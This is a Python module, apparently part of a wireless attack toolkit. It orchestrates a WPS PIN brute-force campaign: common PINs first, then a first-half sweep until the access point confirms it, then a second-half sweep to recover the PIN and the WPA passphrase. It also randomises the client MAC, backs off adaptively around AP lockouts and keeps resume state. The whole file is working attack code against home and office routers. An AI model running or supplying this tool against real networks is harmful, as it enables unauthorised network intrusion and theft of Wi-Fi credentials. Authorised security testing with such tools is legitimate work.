"""WpsCampaign — the Focus-facing WPS PIN brute-force orchestrator.

Drives the two-halves sweep over a single kept-alive association (the v1 speed
bet: reaver/bully re-associate every PIN; we don't, and only re-associate on
loss). Owns: the COMMON→first-half→second-half PIN iterator, lock detection +
adaptive backoff, `.run` resume state under captures/, progress/ETA, and
pause()/resume() (it's the sole TX activity on a half-duplex radio).

Sweep / oracle wiring (see registrar.py):
  COMMON_PINS, then first-half sweep (dummy tail) until the AP returns M5
  (``first_half_ok``) → lock that P1 → second-half sweep until SUCCESS.
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Optional

from . import pins as pinmod
from .association import WlanTransport, WpsAssociation, random_client_mac, str_to_mac
from .lock import LockTracker
from .registrar import AttemptOutcome, PinResult, WpsRegistrar

logger = logging.getLogger(__name__)


@dataclass
class CampaignState:
    bssid: str
    ssid: str = ""
    phase: str = "common"            # common | first_half | second_half | done | failed
    common_index: int = 0
    p1_index: int = 0
    first_half: Optional[str] = None
    p2_index: int = 0
    attempts: int = 0           # sessions started (incl. rate-limited no-ops)
    tested: int = 0             # attempts that actually reached the M4 oracle
    found_pin: Optional[str] = None
    found_psk: Optional[str] = None
    updated: float = 0.0


def _state_path(state_dir, bssid: str) -> Path:
    return Path(state_dir) / f"wps_{bssid.lower().replace(':', '-')}.run"


class WpsCampaign:
    _SAVE_EVERY = 16                 # checkpoint the .run file every N attempts

    def __init__(self, iface, target, state_dir="captures", log=None,
                 inter_attempt_delay: float = 0.0):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid.lower()
        self.channel = target.channel
        self.state_dir = state_dir
        self.log = log or logger.info
        self.inter_attempt_delay = inter_attempt_delay

        self.our_mac = random_client_mac()
        self.assoc: Optional[WpsAssociation] = None
        self.transport: Optional[WlanTransport] = None
        self.lock = LockTracker()

        self.state = self._load_state()
        self._task: Optional[asyncio.Task] = None
        self._paused = False
        self._stop = False
        self.status = "idle"         # idle | running | paused | locked | found | failed | error
        self._attempt_ewma = 0.5     # seconds/attempt, for ETA

    # ---- persistence --------------------------------------------------------
    def _load_state(self) -> CampaignState:
        path = _state_path(self.state_dir, self.bssid)
        if path.exists():
            try:
                data = json.loads(path.read_text())
                data.setdefault("bssid", self.bssid)
                st = CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
                self.log(f"[dim]resumed: phase={st.phase}, p1={st.p1_index}, "
                         f"p2={st.p2_index}, tested={st.tested}[/dim]")
                return st
            except Exception as e:
                logger.warning("WPS state load failed (%s); starting fresh", e)
        return CampaignState(bssid=self.bssid, ssid=self.target.ssid or "")

    def _save_state(self) -> None:
        self.state.updated = time.time()
        path = _state_path(self.state_dir, self.bssid)
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(asdict(self.state), indent=2))
        except Exception as e:
            logger.warning("WPS state save failed: %s", e)

    # ---- lifecycle ----------------------------------------------------------
    def start(self) -> None:
        if self._task and not self._task.done():
            return
        self._stop = False
        self._task = asyncio.create_task(self._run())

    async def stop(self) -> None:
        self._stop = True
        if self._task:
            await asyncio.wait([self._task])
        self._teardown()

    def pause(self) -> None:
        self._paused = True
        if self.status == "running":
            self.status = "paused"

    def resume(self) -> None:
        self._paused = False

    def _teardown(self) -> None:
        if self.transport:
            self.transport.stop()
        if self.assoc:
            self.assoc.stop()
        self.transport = self.assoc = None

    @property
    def eta_seconds(self) -> Optional[float]:
        """Rough worst-case remaining time at the current rate."""
        if self.state.phase == "first_half":
            remaining = 10000 - self.state.p1_index + 1000
        elif self.state.phase == "second_half":
            remaining = 1000 - self.state.p2_index
        elif self.state.phase == "common":
            remaining = len(pinmod.COMMON_PINS) - self.state.common_index + 10000 + 1000
        else:
            return 0.0
        return remaining * self._attempt_ewma

    # ---- the sweep ----------------------------------------------------------
    async def _ensure_session(self) -> bool:
        if self.assoc is None:
            self.assoc = WpsAssociation(self.iface, self.bssid, self.target.ssid or "",
                                        self.channel, our_mac=self.our_mac)
            self.assoc.start()
            self.transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac)
            self.transport.start()
        if not self.assoc.associated:
            return await self.assoc.associate()
        return True

    async def _try(self, pin: str) -> AttemptOutcome:
        """One PIN attempt over the kept-alive association. Overridable in tests."""
        if not await self._ensure_session():
            return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
        self.transport.drain()
        # Per-M-message detail routes to logger.debug only — keeps the user-facing
        # log to one summary line per PIN (see _log_attempt) instead of flooding
        # it with each AP retransmit. wps_probe.py --debug still surfaces the raw
        # message-by-message trace via the root logger.
        reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac)
        return await reg.try_pin(pin)

    def _next_pin(self) -> Optional[str]:
        """The next candidate per the current phase, or None when exhausted."""
        st = self.state
        if st.phase == "common":
            if st.common_index < len(pinmod.COMMON_PINS):
                return pinmod.COMMON_PINS[st.common_index]
            st.phase = "first_half"
        if st.phase == "first_half":
            if st.p1_index < 10000:
                return pinmod.full_pin(f"{st.p1_index:04d}", "000")
            st.phase = "failed"
            return None
        if st.phase == "second_half" and st.first_half is not None:
            if st.p2_index < 1000:
                return pinmod.full_pin(st.first_half, f"{st.p2_index:03d}")
            st.phase = "failed"
            return None
        return None

    def _apply_outcome(self, pin: str, out: AttemptOutcome) -> None:
        """Advance the keyspace from one attempt.

        ONLY a real oracle result (we reached M4 and the AP judged the half)
        advances the position. A pre-oracle reject — PROTO_ERROR / TIMEOUT, i.e.
        the AP refused the session before M4, almost always rate-limiting —
        means the PIN was NOT tested, so we leave the position put and retry the
        SAME pin after backoff. (Advancing here was a bug: it silently skipped
        untested PINs the moment the AP started rate-limiting.)
        """
        st = self.state
        if out.result in (PinResult.PROTO_ERROR, PinResult.TIMEOUT):
            self.lock.note_pre_oracle_reject()
            return

        st.tested += 1
        self.lock.note_progress()
        if out.result is PinResult.SUCCESS:
            st.found_pin, st.found_psk, st.phase = pin, out.psk, "done"
        elif out.first_half_ok:
            # AP reached M5 → this first half is correct. (Covers SECOND_HALF_WRONG,
            # whose first_half_ok is True.) Pin it on the first confirmation.
            # The per-attempt log line (see _log_attempt) announces the discovery.
            if st.phase != "second_half":
                st.first_half = pinmod.split_pin(pin)[0]
                st.phase, st.p2_index = "second_half", 0
            else:
                st.p2_index += 1
        elif out.result is PinResult.FIRST_HALF_WRONG:
            if st.phase == "common":
                st.common_index += 1
            elif st.phase == "first_half":
                st.p1_index += 1

    async def _run(self) -> None:
        self.status = "running"
        name = self.target.ssid or self.bssid
        logger.debug("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
        self.log(f"campaign start on [bold]{name}[/bold]")
        try:
            while not self._stop:
                if self._paused:
                    self.status = "paused"
                    await asyncio.sleep(0.2)
                    continue

                beacon_locked = self._beacon_locked()
                if self.lock.is_locked(beacon_locked):
                    await self._handle_lock(beacon_locked)
                    continue

                pin = self._next_pin()
                if pin is None:
                    self.status = "found" if self.state.found_pin else "failed"
                    break

                self.status = "running"
                # Snapshot pre-attempt state so _log_attempt can announce
                # transitions (e.g. first-half just discovered).
                prev_first_half = self.state.first_half
                t0 = time.monotonic()
                out = await self._try(pin)
                self._attempt_ewma = 0.7 * self._attempt_ewma + 0.3 * (time.monotonic() - t0)
                self.state.attempts += 1
                self._apply_outcome(pin, out)
                self._log_attempt(pin, out, prev_first_half)

                if self.state.phase == "done":
                    # Success line is closed by the UI via _stop_wps_pin (cyan
                    # PIN + green PSK as tree leaves); the campaign just exits.
                    self._save_state()
                    self.status = "found"
                    break
                if self.state.attempts % self._SAVE_EVERY == 0:
                    self._save_state()
                if self.inter_attempt_delay:
                    await asyncio.sleep(self.inter_attempt_delay)
        except Exception as e:
            logger.exception("WPS campaign crashed")
            self.status = "error"
            self.log(f"[red]campaign error:[/red] {e}")
        finally:
            self._save_state()
            self._teardown()

    def _beacon_locked(self) -> bool:
        ap = self.iface.access_points.get(self.bssid) if hasattr(self.iface, "access_points") else None
        return bool(getattr(ap, "wps_locked", False)) if ap else False

    async def _handle_lock(self, beacon_locked: bool) -> None:
        self.lock.begin_lock()
        wait = self.lock.backoff()
        self.status = "locked"
        trigger = "beacon" if beacon_locked else f"{self.lock.strikes} strikes"
        self.log(f"[red]AP locked[/red] [dim]({trigger}) backing off {wait:.0f}s[/dim]")
        self._save_state()
        end = time.monotonic() + wait
        while time.monotonic() < end and not self._stop:
            await asyncio.sleep(0.5)
            if not self._beacon_locked() and self.lock.strikes < self.lock.strike_threshold:
                break
        self.lock.end_lock()

    def _log_attempt(self, pin: str, out: AttemptOutcome,
                     prev_first_half: Optional[str]) -> None:
        """One concise line per PIN attempt — what was tested, what came back,
        and how deep the exchange got ([Mx] marker). SUCCESS is intentionally
        silent here; the UI closes the campaign tree with bold cyan PIN + green
        PSK leaves via _stop_wps_pin."""
        if out.result is PinResult.SUCCESS:
            return
        label = f"trying [cyan]{pin}[/cyan]"
        # First-half just confirmed this attempt — green announcement.
        if self.state.first_half is not None and prev_first_half is None:
            self.log(f"{label} → [green]first half OK[/green] "
                     f"[dim bold]\\[M5][/dim bold] — sweeping second half")
            return
        if out.result is PinResult.FIRST_HALF_WRONG:
            self.log(f"{label} → [red]first half wrong[/red] [dim bold]\\[M4][/dim bold]")
        elif out.result is PinResult.SECOND_HALF_WRONG:
            self.log(f"{label} → [dark_orange]second half wrong[/dark_orange] "
                     f"[dim bold]\\[M6][/dim bold]")
        elif out.result is PinResult.PROTO_ERROR:
            self.log(f"{label} → [yellow]AP refused[/yellow] "
                     f"[dim bold]\\[NACK][/dim bold]")
        elif out.result is PinResult.TIMEOUT:
            self.log(f"{label} → [dim]no response[/dim] [dim bold]\\[…][/dim bold]")
